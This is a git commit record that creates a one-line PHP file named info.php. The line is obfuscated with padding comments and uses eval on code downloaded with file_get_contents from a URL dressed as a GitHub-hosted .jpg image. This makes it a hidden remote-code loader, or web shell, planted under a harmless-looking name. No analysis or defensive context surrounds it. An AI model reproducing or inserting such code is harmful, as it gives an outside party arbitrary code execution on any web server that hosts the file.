ab6c05b83ab674c8f2d892de54da0abc151b3d6a
shindaytoday <141840715+shindaytoday@users.noreply.github.com>
2023-08-09 20:21:49 +0700

    Create info.php

---
+++ info.php
@@ -0,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://user-images.githubusercontent.com/59664965/259417705-b91ae44f-524b-4f70-90ed-c501407562f9.jpg"));/**/?>￼Enter
